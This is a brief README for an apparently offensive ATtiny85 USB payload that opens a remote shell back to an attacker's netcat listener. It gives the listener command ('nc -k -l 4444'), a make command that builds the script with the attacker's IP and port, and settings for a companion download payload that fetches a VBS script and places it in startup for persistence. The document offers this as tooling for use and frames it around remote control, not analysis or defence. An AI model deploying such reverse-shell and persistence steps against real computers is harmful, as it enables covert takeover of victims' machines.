# Objective

Allows you to open a remote shell (for remote control) by connecting to a computer that has opened a netcat server as follows:  
``nc -k -l 4444``  
This code can be made persistent thanks to the payload: [https://github.com/jzyra/Attiny85Payloads/tree/main/payloads/download](https://github.com/jzyra/Attiny85Payloads/tree/main/payloads/ download)

# Build

The script to use must be generated with the make command, specifying the IP address and port of the netcat server:

    make IP=127.0.0.1 PORT=4444

# Download payload settings

* __URL__ : Direct download URL to the ``out.vbs`` script.
* __EXE_FILENAME__ : tmp.vbs
* __STARTUP__ : Set.
